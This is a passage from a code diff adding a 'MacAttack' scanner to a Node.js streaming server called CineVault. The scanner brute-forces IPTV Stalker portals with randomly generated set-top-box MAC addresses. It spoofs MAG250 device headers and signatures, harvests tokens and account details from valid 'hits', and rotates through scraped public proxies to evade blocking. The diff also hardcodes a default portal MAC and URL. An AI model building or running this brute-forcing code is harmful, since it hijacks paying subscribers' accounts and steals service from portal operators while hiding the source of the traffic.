+            const vidUrl = genHtml.match(/https?:\/\/[^"'\s]+\.m3u8[^"'\s]*/)?.[0] ||
+                           genHtml.match(/https?:\/\/[^"'\s]+\.mp4[^"'\s]*/)?.[0] ||
+                           null;
+            if (vidUrl) {
+              stream.directUrl = vidUrl;
+              stream.status = 'live';
+            } else {
+              stream.directUrl = stream.hostUrl;
+              stream.status = 'host';
+            }
+          } catch {
+            stream.directUrl = stream.hostUrl;
+            stream.status = 'host';
+          }
+        }
+      } catch (err) {
+        console.error(`[STREAM] Host URL extraction error: ${err.message}`);
+        stream.directUrl = stream.hostUrl;
+        stream.status = 'error';
+        stream.error = 'Host URL extraction failed';
+      }
+    }
+
+    setCache(cacheKey, result, 300000); // cache 5 min
+    res.json(result);
+  } catch (err) {
+    console.error(`[STREAM] Error resolving ${imdb}:`, err.message);
+    result.error = 'Stream resolution failed';
+    res.json(result);
+  }
+});
+
+// ═══════════════════════════════════════════
+//  STATIC FILES — Serve the CineVault SPA
+// ═══════════════════════════════════════════
+app.use(express.static(__dirname, {
+  maxAge: 0,
+  setHeaders: (res, filePath) => {
+    // No cache for HTML and JS/CSS — critical for streaming fixes to take effect
+    if (filePath.endsWith('.html') || filePath.match(/\.(js|css)$/)) {
+      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    }
+    // Long cache for static assets (images, fonts)
+    if (filePath.match(/\.(jpg|jpeg|png|gif|svg|ico|webp|woff2?)$/)) {
+      res.setHeader('Cache-Control', 'public, max-age=3600');
+    }
+  },
+}));
+
+// ── Secure Config Endpoint ──
+// Serves stalker portal creds server-side so they're not in client JS
+app.get('/api/config', (req, res) => {
+  const origin = getAllowedOrigin ? getAllowedOrigin(req) : (req.headers.origin || '');
+  res.setHeader('Access-Control-Allow-Origin', origin);
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+  const stalkerMac  = process.env.STALKER_MAC  || '00:1A:79:A3:96:BF';
+  const stalkerUrl  = process.env.STALKER_PORTAL_URL || 'http://www.streamtv.to:8080/c/';
+  const omdbKey     = process.env.OMDB_API_KEY   || 'trilogy';
+  res.json({
+    stalkerPortals: [{
+      name: 'Portal A3',
+      mac: stalkerMac,
+      url: stalkerUrl,
+      type: 'stalker_portal',
+      notes: 'Pre-loaded — lots of channels'
+    }],
+    omdbApiKey: omdbKey
+  });
+});
+
+// ── MacAttack Desktop App endpoints ──
+const MACATTACK_PATH = '/home/ghost/MacAttack/MacAttack.pyw';
+const MACATTACK_DIR = '/home/ghost/MacAttack';
+
+app.get('/api/macattack/status', (req, res) => {
+  try {
+    const { execSync } = require('child_process');
+    // Find running MacAttack process
+    const out = execSync('pgrep -f "python3 MacAttack.pyw" || true', { timeout: 5000 }).toString().trim();
+    if (!out) {
+      return res.json({ running: false, pid: null, uptime: null, cpu: null, mem: null });
+    }
+    const pid = out.split('\n')[0].trim();
+    // Get process stats
+    let uptime = '—', cpu = '—', mem = '—';
+    try {
+      const stats = execSync(`ps -p ${pid} -o etimes=,pcpu=,pmem= --no-headers 2>/dev/null || echo ""`, { timeout: 3000 }).toString().trim();
+      if (stats) {
+        const [sec, c, m] = stats.split(/\s+/);
+        const s = parseInt(sec) || 0;
+        const h = Math.floor(s/3600);
+        const min = Math.floor((s%3600)/60);
+        uptime = h > 0 ? `${h}h ${min}m` : `${min}m`;
+        cpu = parseFloat(c).toFixed(1) + '%';
+        mem = parseFloat(m).toFixed(1) + '%';
+      }
+    } catch {}
+    res.json({ running: true, pid, uptime, cpu, mem });
+  } catch (e) {
+    res.json({ running: false, pid: null, uptime: null, cpu: null, mem: null, error: e.message });
+  }
+});
+
+app.post('/api/macaction/launch', (req, res) => {
+  try {
+    const { execSync } = require('child_process');
+    // Check if already running
+    const existing = execSync('pgrep -f "python3 MacAttack.pyw" || true', { timeout: 5000 }).toString().trim();
+    if (existing) {
+      return res.json({ ok: false, error: 'MacAttack is already running (PID ' + existing.split('\n')[0].trim() + ')' });
+    }
+    // Launch MacAttack in background on DISPLAY=:0 — separate stdout/stderr for console streaming
+    const cmd = `cd ${MACATTACK_DIR} && DISPLAY=:0 LIBGL_ALWAYS_SOFTWARE=1 nohup python3 MacAttack.pyw > /tmp/macattack-output.log 2> /tmp/macattack-error.log & echo $!`;
+    const pid = execSync(cmd, { timeout: 10000, detached: true }).toString().trim();
+    // Small delay then verify it's actually running
+    setTimeout(() => {
+      try {
+        const check = execSync('pgrep -f "python3 MacAttack.pyw" || true', { timeout: 3000 }).toString().trim();
+        if (!check) {
+          // Process died immediately — read log
+          try {
+            const log = execSync('tail -5 /tmp/macattack-error.log 2>/dev/null || echo "no log"', { timeout: 3000 }).toString();
+            console.error('[MacAttack] Launch failed:', log);
+          } catch {}
+        }
+      } catch {}
+    }, 2000);
+    res.json({ ok: true, pid });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+app.post('/api/macaction/kill', (req, res) => {
+  try {
+    const { execSync } = require('child_process');
+    const out = execSync('pgrep -f "python3 MacAttack.pyw" || true', { timeout: 5000 }).toString().trim();
+    if (!out) {
+      return res.json({ ok: false, error: 'MacAttack is not running' });
+    }
+    const pids = out.split('\n').filter(Boolean);
+    for (const pid of pids) {
+      try { process.kill(parseInt(pid), 'SIGTERM'); } catch {}
+    }
+    // Wait and verify
+    setTimeout(() => {
+      try {
+        const check = execSync('pgrep -f "python3 MacAttack.pyw" || true', { timeout: 3000 }).toString().trim();
+        if (check) {
+          // Force kill
+          for (const pid of check.split('\n').filter(Boolean)) {
+            try { process.kill(parseInt(pid), 'SIGKILL'); } catch {}
+          }
+        }
+      } catch {}
+    }, 2000);
+    res.json({ ok: true, killed: pids.length });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+// ── MacAttack Console Log Streaming ──
+app.get('/api/macattack/output-log', (req, res) => {
+  try {
+    const { execSync } = require('child_process');
+    const lines = parseInt(req.query.lines) || 200;
+    const log = execSync(`tail -n ${lines} /tmp/macattack-output.log 2>/dev/null || echo "MacAttack not launched yet."`, { timeout: 5000 }).toString();
+    res.type('text/plain').send(log);
+  } catch (e) {
+    res.type('text/plain').send('MacAttack not launched yet.');
+  }
+});
+
+app.get('/api/macattack/error-log', (req, res) => {
+  try {
+    const { execSync } = require('child_process');
+    const lines = parseInt(req.query.lines) || 200;
+    const log = execSync(`tail -n ${lines} /tmp/macattack-error.log 2>/dev/null || echo "No errors yet."`, { timeout: 5000 }).toString();
+    res.type('text/plain').send(log);
+  } catch (e) {
+    res.type('text/plain').send('No errors yet.');
+  }
+});
+
+app.post('/api/macaction/clear-logs', (req, res) => {
+  try {
+    const { writeFileSync } = require('fs');
+    // Clear the log files (MacAttack will reopen them on next write)
+    writeFileSync('/tmp/macattack-output.log', '');
+    writeFileSync('/tmp/macattack-error.log', '');
+    writeFileSync('/tmp/macattack-launch.log', '');
+    res.json({ ok: true });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+// ── MacAttack Scan API ──
+// Starts a scan using the MacAttack desktop app's command file interface.
+// Keep command files under the project data dir so the web server can always write them.
+const MACATTACK_CMD_DIR = path.join(__dirname, 'data', 'macattack-commands');
+try { require('fs').mkdirSync(MACATTACK_CMD_DIR, { recursive: true }); } catch {}
+
+// ── MacAttack Config — returns saved portal URL/MAC for auto-population ──
+app.get('/api/macaction/config', (req, res) => {
+  try {
+    const { readFileSync, existsSync } = require('fs');
+    // Try current-scan.json first
+    const currentScan = `${MACATTACK_CMD_DIR}/current-scan.json`;
+    if (existsSync(currentScan)) {
+      const data = JSON.parse(readFileSync(currentScan, 'utf8'));
+      return res.json({ ok: true, url: data.url || '', mac: data.mac || '', type: data.type || 'Autodetect' });
+    }
+    // Fallback: try most recent scan file
+    const { readdirSync } = require('fs');
+    const { join } = require('path');
+    const files = readdirSync(MACATTACK_CMD_DIR).filter(f => f.startsWith('scan-') && f.endsWith('.json'));
+    if (files.length > 0) {
+      files.sort().reverse(); // most recent first
+      const latest = JSON.parse(readFileSync(join(MACATTACK_CMD_DIR, files[0]), 'utf8'));
+      return res.json({ ok: true, url: latest.url || '', mac: latest.mac || '', type: latest.type || 'Autodetect' });
+    }
+    res.json({ ok: true, url: '', mac: '', type: 'Autodetect' });
+  } catch (e) {
+    res.json({ ok: false, error: e.message, url: '', mac: '', type: 'Autodetect' });
+  }
+});
+
+// ── MacAttack Server-Side Scanner Engine ──
+// Replaces the old command-file approach that required MacAttack.pyw to be running.
+// This engine runs natively in Node.js — no Python dependency.
+
+let activeScan = null;   // { running, url, type, prefix, speed, clients }
+let scanResults = [];     // accumulated hits across scans
+
+// Load previously saved scan results from disk
+const SCAN_RESULTS_FILE = path.join(MACATTACK_CMD_DIR, 'scan-results.json');
+try {
+  if (fs.existsSync(SCAN_RESULTS_FILE)) {
+    scanResults = JSON.parse(fs.readFileSync(SCAN_RESULTS_FILE, 'utf8'));
+  }
+} catch { scanResults = []; }
+
+function detectPortalType(url, type) {
+  const resolved = resolveMacAttackPortalEndpoint(url, type);
+  if (resolved.apiUrl) return resolved.apiUrl;
+  // If user explicitly chose a type, use it
+  if (type && type !== 'Autodetect') {
+    return type.toLowerCase().includes('portal') ? '/portal.php' : '/server/load.php';
+  }
+  // Autodetect from URL
+  const lower = url.toLowerCase();
+  if (lower.includes('portal')) return '/portal.php';
+  if (lower.includes('streamtv') || lower.includes('stalker')) return '/server/load.php';
+  // Default to stalker (server/load.php)
+  return '/server/load.php';
+}
+
+function randomHexOctet() {
+  return Math.floor(Math.random() * 256).toString(16).toUpperCase().padStart(2, '0');
+}
+
+function generateRandomMac(prefix) {
+  // prefix like "00:1A:79:" — fill remaining 3 octets
+  const clean = prefix.replace(/:+$/, ''); // strip trailing colon
+  return `${clean}:${randomHexOctet()}:${randomHexOctet()}:${randomHexOctet()}`;
+}
+
+function sha256Hex(str) {
+  return crypto.createHash('sha256').update(str).digest('hex').toUpperCase();
+}
+
+function md5Hex(str) {
+  return crypto.createHash('md5').update(str).digest('hex').toUpperCase();
+}
+
+async function sendSSE(clientList, data) {
+  const payload = `data: ${JSON.stringify(data)}\n\n`;
+  for (const c of clientList) {
+    try { c.res.write(payload); } catch {}
+  }
+}
+
+// ── Proxy helper for MacAttack scanner ──
+function getProxyAgent(proxyStr, targetUrl) {
+  if (!proxyStr) return undefined;
+  try {
+    const proxyUrl = proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`;
+    return targetUrl.startsWith('https') ? new HttpsProxyAgent(proxyUrl) : new HttpProxyAgent(proxyUrl);
+  } catch { return undefined; }
+}
+
+async function runScanLoop(scan) {
+  const { url, type, prefix, speed, proxies } = scan;
+  const resolvedPortal = resolveMacAttackPortalEndpoint(url, type);
+  const baseUrl = resolvedPortal.apiUrl || detectPortalType(url, type);
+  const portalHost = resolvedPortal.hostBase || String(url || '').replace(/\/+$/, '');
+  const portalType = '';
+  const delay = Math.max(10, Math.round(1000 / (speed || 10)));
+  let totalTried = 0;
+  const proxyList = (proxies || '').split(/[\s,\t]+/).filter(p => p.includes(':'));
+  const ludicrous = speed >= 30;
+  const WORKERS = ludicrous ? 5 : 1;  // 5 concurrent MACs at once in ludicrous mode
+
+  const UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+
+  function pickProxy() {
+    if (!proxyList.length) return null;
+    return proxyList[Math.floor(Math.random() * proxyList.length)];
+  }
+
+  function makeHeaders(mac, sn, deviceId, deviceId2, hwVersion2, token, tokenRandom) {
+    const base = {
+      'User-Agent': UA,
+      'Accept': '*/*',
+      'Accept-Encoding': 'identity',
+      'Connection': 'keep-alive',
+      'Cookie': `mac=${mac}; sn=${sn}; debug=1; device_id=${deviceId}; device_id2=${deviceId2}; stb_lang=en; timezone=America/Los_Angeles; hw_version=1.7-BD-00; adid=${hwVersion2}`,
+    };
+    if (token) {
+      base['Authorization'] = `Bearer ${token}`;
+      base['X-Random'] = `${tokenRandom}`;
+    }
+    return base;
+  }
+
+  async function testOneMac() {
+    if (!scan.running) return;
+    const mac = generateRandomMac(prefix);
+    const sn = md5Hex(mac).substring(0, 13);
+    const deviceId = sha256Hex(sn).substring(0, 16);
+    const deviceId2 = sha256Hex(mac).substring(0, 16);
+    const hwVersion2 = crypto.createHash('sha1').update(mac).digest('hex');
+    const snmac = `${sn}${mac}`;
+    const proxy = pickProxy();
+    const proxyLabel = proxy || 'Direct';
+    const agent = getProxyAgent(proxy, baseUrl);
+
+    sendSSE(scan.clients, { event: 'trying', mac, proxy: proxyLabel });
+    totalTried++;
+
+    try {
+      // Step 1: Handshake
+      const handshakeUrl = `${baseUrl}${portalType}?action=handshake&type=stb&JsHttpRequest=1-xml`;
+      const fetchOpts = {
+        headers: makeHeaders(mac, sn, deviceId, deviceId2, hwVersion2),
+        signal: AbortSignal.timeout(15000),
+      };
+      if (agent) fetchOpts.agent = agent;
+
+      const handshakeRes = await fetch(handshakeUrl, fetchOpts);
+      const handshakeData = await handshakeRes.json().catch(() => null);
+      const token = handshakeData?.js?.token;
+
+      if (!token) {
+        await new Promise(r => setTimeout(r, delay));
+        return;
+      }
+
+      // Step 2: Get profile
+      const tokenRandom = handshakeData?.js?.random || 0;
+      let profileSig = sha256Hex(snmac);
+      if (tokenRandom && tokenRandom !== 0) {
+        profileSig = sha256Hex(String(tokenRandom));
+      }
+      const metrics = JSON.stringify({ mac, sn, type: 'STB', model: 'MAG250', uid: deviceId, random: tokenRandom });
+      const encodedMetrics = encodeURIComponent(metrics);
+
+      const profileUrl = `${baseUrl}${portalType}?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-250%3B%20ImageDate%3A%20Wed%20Aug%2029%2010%3A49%3A53%20EEST%202018%3B%20PORTAL%20version%3A%205.5.0%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146%3B%20Player%20Engine%20version%3A%200x58c&num_banks=2&sn=${sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id=${deviceId2}&device_id2=${deviceId2}&sig=${profileSig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=${encodedMetrics}&hw_version_2=${hwVersion2}&timestamp=${Math.round(Date.now() / 1000)}&api_sig=262&prehash=0`;
+
+      const profileOpts = {
+        headers: makeHeaders(mac, sn, deviceId, deviceId2, hwVersion2, token, tokenRandom),
+        signal: AbortSignal.timeout(15000),
+      };
+      if (agent) profileOpts.agent = agent;
+      await fetch(profileUrl, profileOpts).catch(() => null);
+
+      // Step 3: Get channels — MacAttack counts channels > 0 as a HIT, no sub check needed
+      let channelCount = 0;
+      try {
+        const chUrl = `${baseUrl}${portalType}?type=itv&action=get_all_channels&JsHttpRequest=1-xml`;
+        const chOpts = {
+          headers: makeHeaders(mac, sn, deviceId, deviceId2, hwVersion2, token, tokenRandom),
+          signal: AbortSignal.timeout(15000),
+        };
+        if (agent) chOpts.agent = agent;
+        const chRes = await fetch(chUrl, chOpts);
+        const chData = await chRes.json().catch(() => null);
+        channelCount = chData?.js?.data?.length || 0;
+      } catch {}
+
+      if (channelCount > 0) {
+        // HIT! Same logic as MacAttack: any MAC with channels is a valid hit
+        // Now grab optional extra info
+        let expiry = 'Unknown', tariffPlanId = 0, verified = 0, streamWorks = false, streamDomain = null;
+        let accountInfo = {};
+
+        // Try account info (optional, won't block the hit)
+        try {
+          const accountUrl = `${baseUrl}${portalType}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`;
+          const accountOpts = {
+            headers: makeHeaders(mac, sn, deviceId, deviceId2, hwVersion2, token, tokenRandom),
+            signal: AbortSignal.timeout(15000),
+          };
+          if (agent) accountOpts.agent = agent;
+          const accountRes = await fetch(accountUrl, accountOpts).catch(() => null);
+          if (accountRes) {
+            const accountData = await accountRes.json().catch(() => null);
+            if (accountData?.js) {
+              accountInfo = accountData.js;
+              tariffPlanId = accountData.js.tariff_plan_id || 0;
+              verified = accountData.js.verified || 0;
+              if (accountData.js.phone !== undefined) {
+                expiry = String(accountData.js.phone || 'Unknown');
+                try {
+                  const ts = parseInt(expiry);
+                  if (!isNaN(ts) && ts > 1000000000 && ts < 2000000000) {
+                    expiry = new Date(ts * 1000).toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+                  }
+                } catch {}
+              }
+            }
+          }
+        } catch {}
+
+        // Try CDN stream test (optional)
+        try {
+          const clUrl = `${baseUrl}${portalType}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml`;
+          const clOpts = {
+            headers: makeHeaders(mac, sn, deviceId, deviceId2, hwVersion2, token, tokenRandom),
+            signal: AbortSignal.timeout(15000),
+          };
+          if (agent) clOpts.agent = agent;
+          const clRes = await fetch(clUrl, clOpts);
+          const clData = await clRes.json().catch(() => null);
+          const cmdVal = clData?.js?.cmd;
+          if (cmdVal) {
+            const streamUrl = cmdVal.replace('ffmpeg ', '').replace("'ffmpeg' ", '').trim();
+            try {
+              const parsed = new URL(streamUrl);
+              streamDomain = parsed.hostname;
+              const cdnOpts = { method: 'HEAD', signal: AbortSignal.timeout(8000) };
+              const cdnAgent = getProxyAgent(proxy, streamUrl);
+              if (cdnAgent) cdnOpts.agent = cdnAgent;
+              const cdnRes = await fetch(streamUrl, cdnOpts).catch(() => null);
+              if (cdnRes && cdnRes.ok) streamWorks = true;
+            } catch {}
+          }
+        } catch {}
+
+        const hit = { mac, token, expiry, url: portalHost, portal: baseUrl, portalType: resolvedPortal.style || type || 'Portal', account: accountInfo, tariffPlanId, verified, channelCount, streamWorks, streamDomain, proxy: proxyLabel, foundAt: new Date().toISOString() };
+
+        scanResults.push(hit);
+        try { fs.writeFileSync(SCAN_RESULTS_FILE, JSON.stringify(scanResults, null, 2)); } catch {}
+        try {
+          const phFile = path.join(__dirname, 'data', 'portal-hits.json');
+          let phData;
+          try { phData = JSON.parse(fs.readFileSync(phFile, 'utf8')); }
+          catch { phData = { hits: [], lastScan: null }; }
+          const phExisting = phData.hits.findIndex(h => h.portal === portalHost && h.mac === mac);
+          const phEntry = { portal: portalHost, endpoint: baseUrl, mac, channels: channelCount, status: 'hit', method: 'scan', lastChecked: new Date().toISOString(), found: new Date().toISOString() };
+          if (phExisting >= 0) phData.hits[phExisting] = { ...phData.hits[phExisting], ...phEntry };
+          else phData.hits.push(phEntry);
+          phData.hits.sort((a, b) => (b.channels || 0) - (a.channels || 0));
+          phData.lastScan = new Date().toISOString();
+          fs.writeFileSync(phFile, JSON.stringify(phData, null, 2));
+        } catch {}
+
+        sendSSE(scan.clients, { event: 'hit', mac, token, expiry, url: portalHost, endpoint: baseUrl, portalType: resolvedPortal.style || type || 'Portal', account: accountInfo, channelCount, streamWorks, streamDomain, tariffPlanId, verified, proxy: proxyLabel });
+      }
+    } catch {
+      // Timeout or network error — move on
+    }
+  }
+
+  // Run workers concurrently for ludicrous speed, or sequential for normal
+  if (WORKERS > 1) {
+    const workers = Array.from({ length: WORKERS }, () =>
+      (async () => {
+        while (scan.running) {
+          await testOneMac();
+          await new Promise(r => setTimeout(r, delay));
+        }
+      })()
+    );
+    await Promise.all(workers);
+  } else {
+    while (scan.running) {
+      await testOneMac();
+      await new Promise(r => setTimeout(r, delay));
+    }
+  }
+
+  // Scan finished
+  sendSSE(scan.clients, { event: 'done', totalTried, hits: scanResults.length });
+  for (const c of scan.clients) {
+    try { c.res.end(); } catch {}
+  }
+  scan.clients = [];
+}
+
+app.post('/api/macaction/scan', (req, res) => {
+  try {
+    const { url, type, prefix, speed, proxies } = req.body || {};
+    if (!url) return res.json({ ok: false, error: 'IPTV link required' });
+
+    // If proxies is 'auto' or empty, try to load from MacAttack.ini
+    let proxyStr = proxies || '';
+    if (!proxyStr || proxyStr === 'auto') {
+      try {
+        const iniPath = '/root/evilvir.us/MacAttack.ini';
+        if (fs.existsSync(iniPath)) {
+          const ini = fs.readFileSync(iniPath, 'utf8');
+          const proxyRe = new RegExp('proxy_list\\s*=\\s*([\\s\\S]*?)(?:\\n\\[|\\n*$)');
+          const proxyMatch = ini.match(proxyRe);
+          if (proxyMatch) {
+            proxyStr = proxyMatch[1].replace(/\t/g, '\n').replace(/\s+/g, '\n').split('\n').map(p => p.trim()).filter(p => p && p.includes(':')).join('\n');
+          }
+        }
+      } catch {}
+    }
+
+    // If a scan is already running, stop it first
+    if (activeScan && activeScan.running) {
+      activeScan.running = false;
+      for (const c of activeScan.clients) { try { c.res.end(); } catch {} }
+      activeScan.clients = [];
+    }
+
+    // Start new scan
+    activeScan = {
+      running: true,
+      url,
+      type: type || 'Autodetect',
+      prefix: prefix || '00:1A:79:',
+      speed: parseInt(speed) || 10,
+      proxies: proxyStr,
+      clients: [],
+    };
+
+    // Also persist scan config for auto-population
+    try {
+      fs.writeFileSync(`${MACATTACK_CMD_DIR}/current-scan.json`, JSON.stringify({
+        url, type, prefix, speed, startedAt: Date.now(), status: 'scanning'
+      }));
+    } catch {}
+
+    // Run scan loop in background (non-blocking)
+    runScanLoop(activeScan).catch(err => {
+      console.error('[MacAttack Scanner] Scan loop error:', err.message);
+      if (activeScan) activeScan.running = false;
+    });
+
+    res.json({ ok: true });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+// Load proxy list from MacAttack.ini
+app.get('/api/macaction/proxies', (req, res) => {
+  try {
+    const iniPath = '/root/evilvir.us/MacAttack.ini';
+    if (!fs.existsSync(iniPath)) return res.json({ proxies: '', count: 0 });
+    const ini = fs.readFileSync(iniPath, 'utf8');
+    const proxyRe = new RegExp('proxy_list\\s*=\\s*([\\s\\S]*?)(?:\\n\\[|\\n*$)');
+    const proxyMatch = ini.match(proxyRe);
+    if (!proxyMatch) return res.json({ proxies: '', count: 0 });
+    const list = proxyMatch[1].replace(/\t/g, '\n').replace(/\s+/g, '\n').split('\n').map(p => p.trim()).filter(p => p && p.includes(':'));
+    res.json({ proxies: list.join('\n'), count: list.length });
+  } catch (e) {
+    res.json({ proxies: '', count: 0, error: e.message });
+  }
+});
+
+app.get('/api/macaction/portal-info', async (req, res) => {
+  try {
+    const portalUrl = String(req.query.url || '').trim();
+    const mac = String(req.query.mac || '').trim();
+    if (!portalUrl) return res.status(400).json({ ok: false, error: 'Missing url' });
+    if (!mac) return res.status(400).json({ ok: false, error: 'Missing mac' });
+    if (!isUrlAllowed(portalUrl)) return res.status(403).json({ ok: false, error: 'Blocked: URL targets private/internal network' });
+
+    const resolved = resolveStalkerPortal(portalUrl);
+    const serial = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+    const deviceId = crypto.createHash('sha256').update(serial).digest('hex').toUpperCase();
+    const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+    const hwVersion2 = crypto.createHash('sha1').update(mac).digest('hex');
+    let ip = '';
+    try {
+      const hostname = new URL(resolved.hostBase || portalUrl).hostname;
+      const lookup = await dns.lookup(hostname);
+      ip = lookup?.address || '';
+    } catch {}
+
+    res.json({
+      ok: true,
+      portal: resolved.hostBase || portalUrl,
+      endpoint: resolved.apiUrl,
+      style: resolved.style,
+      ip,
+      mac,
+      serial,
+      deviceId,
+      deviceId2,
+      hwVersion2,
+    });
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+// SSE endpoint for real-time scan progress
+app.get('/api/macaction/scan-events', (req, res) => {
+  res.writeHead(200, {
+    'Content-Type': 'text/event-stream',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'X-Accel-Buffering': 'no',
+  });
+  res.write('\n'); // flush headers
+
+  if (activeScan && activeScan.running) {
+    activeScan.clients.push({ res });
+  } else {
+    // No active scan — close immediately
+    res.write(`data: ${JSON.stringify({ event: 'done', totalTried: 0, hits: scanResults.length })}\n\n`);
+    res.end();
+  }
+
+  // Clean up on client disconnect
+  req.on('close', () => {
+    if (activeScan && activeScan.clients) {
+      activeScan.clients = activeScan.clients.filter(c => c.res !== res);
+    }
+  });
+});
+
+// Get all scan results
+app.get('/api/macaction/scan-results', (req, res) => {
+  try {
+    if (fs.existsSync(SCAN_RESULTS_FILE)) {
+      const data = JSON.parse(fs.readFileSync(SCAN_RESULTS_FILE, 'utf8'));
+      return res.json({ ok: true, results: data });
+    }
+    res.json({ ok: true, results: scanResults });
+  } catch (e) {
+    res.json({ ok: false, error: e.message, results: scanResults });
+  }
+});
+
+app.post('/api/macaction/stop-scan', (req, res) => {
+  try {
+    if (activeScan && activeScan.running) {
+      activeScan.running = false;
+      // SSE clients will be cleaned up by the scan loop finishing
+    }
+    // Also update current-scan file
+    try {
+      const currentScan = `${MACATTACK_CMD_DIR}/current-scan.json`;
+      if (fs.existsSync(currentScan)) {
+        const data = JSON.parse(fs.readFileSync(currentScan, 'utf8'));
+        data.status = 'stopped';
+        fs.writeFileSync(currentScan, JSON.stringify(data));
+      }
+    } catch {}
+    res.json({ ok: true });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+// ── MacAttack Player API: Get Playlist ──
+// Fetches playlist from a stalker/portal using the provided host/MAC
+app.post('/api/macaction/get-playlist', async (req, res) => {
+  try {
+    const { host, mac, proxy, limit, preferUS, usOnly } = req.body || {};
+    if (!host || !mac) return res.json({ ok: false, error: 'Host and MAC are required' });
+    const requestedLimit = parseInt(limit || '160000', 10) || 160000;
+    const upstreamLimit = preferUS === false ? requestedLimit : 160000;
+    // Register active stalker portal for VLC launch
+    global._stalkerPortalUrl = host;
+    global._stalkerMac = mac;
+
+    const qs = new URLSearchParams({
+      url: host,
+      mac,
+      proxy: proxy || 'server',
+      limit: String(upstreamLimit),
+      preferUS: preferUS === false ? '0' : '1',
+      usOnly: usOnly ? '1' : '0',
+    });
+    const upstream = await fetch(`http://127.0.0.1:${PORT}/api/stalker-channels?${qs.toString()}`, {
+      headers: { 'User-Agent': 'CineVault/2.0 MacAttack Player' },
+      signal: AbortSignal.timeout(90000),
+    });
+    const data = await upstream.json();
+    if (!upstream.ok || data.error) {
+      return res.json({ ok: false, error: data.error || data.detail || 'Handshake failed — no token received. Check host/MAC.' });
+    }
+
+    let channels = (data.channels || []).map(ch => ({
+      name: ch.name || ch.title || 'Unknown',
+      url: ch.url || ch.stream_url || ch.cmd || '',
+      cmd: ch.cmd || ch.url || ch.stream_url || '',
+      type: (ch.type || 'live').toString().toLowerCase().includes('vod') ? 'movies' : 'live',
+      id: ch.id || ch.channel_id || '',
+      number: ch.number || ch.ch_number || '',
+      logo: ch.logo || ch.icon || '',
+      group: ch.group || ch.genreName || ch.genre || '',
+      genreName: ch.genreName || ch.group || ch.genre || '',
+      host,
+      mac,
+    }));
+    const isUSChannel = (ch) => {
+      const groupText = `${ch.genreName || ''} ${ch.group || ''}`;
+      if (/(^|[^a-z0-9])(united\s*states|usa|u\.s\.a\.?|u\.s\.|us|american)([^a-z0-9]|$)/i.test(groupText)) return true;
+      if (groupText.trim()) return false;
+      return /(^|[^a-z0-9])(united\s*states|usa|u\.s\.a\.?|u\.s\.|us|american)([^a-z0-9]|$)/i.test(ch.name || '');
+    };
+    const isPlayableChannel = (ch) => {
+      const name = String(ch.name || '').trim();
+      if (!name || /^(#+|=+|-{4,})/.test(name)) return false;
+      if (/^(#+|=+).*(#+|=+)$/i.test(name)) return false;
+      return Boolean(ch.cmd || ch.url);
+    };
+    channels = channels.filter(isPlayableChannel);
+    if (usOnly) channels = channels.filter(isUSChannel);
+    if (preferUS !== false) {
+      channels.sort((a, b) => {
+        const aUS = isUSChannel(a) ? 0 : 1;
+        const bUS = isUSChannel(b) ? 0 : 1;
+        if (aUS !== bUS) return aUS - bUS;
+        return (Number(a.number) || 0) - (Number(b.number) || 0);
+      });
+    }
+    if (channels.length > requestedLimit) channels = channels.slice(0, requestedLimit);
+    // Cache channels for VLC launch fallback
+    global._stalkerChannelCache = channels;
+    res.json({
+      ok: true,
+      channels,
+      total: channels.length,
+      rawTotal: data.channelCount || channels.length,
+      usCount: channels.filter(isUSChannel).length,
+      token: data.token || '',
+      random: data.random || '',
+    });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+// ── MacAttack Proxy API ──
+app.post('/api/macaction/fetch-proxies', async (req, res) => {
+  try {
+    const https = require('https');
+    const http = require('http');
+    const sources = [
+      'https://spys.me/proxy.txt',
+      'https://free-proxy-list.net/',
+      'https://www.us-proxy.org/',
+      'https://www.sslproxies.org/',
+      'https://free-proxy-list.net/anonymous-proxy.html',
+      'https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=1',
+      'https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=2',
+      'https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=3',
+      'https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=4',
+      'https://www.freeproxy.world/?type=http&anonymity=4&country=&speed=400&port=&page=5',
+	      'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+	      'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
+	      'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt'
+	    ];
+	    let allProxies = new Set();
+    function extractProxies(src, body) {
+      const out = [];
+      if (src.includes('spys.me') || src.includes('raw.githubusercontent.com')) {
+        const matches = body.match(/\b\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}\b/g) || [];
+        out.push(...matches);
+      } else if (src.includes('free-proxy-list.net') || src.includes('us-proxy.org') || src.includes('sslproxies.org')) {
+        const re = /<td>(\d+\.\d+\.\d+\.\d+)<\/td>\s*<td>(\d+)<\/td>/g;
+        let m;
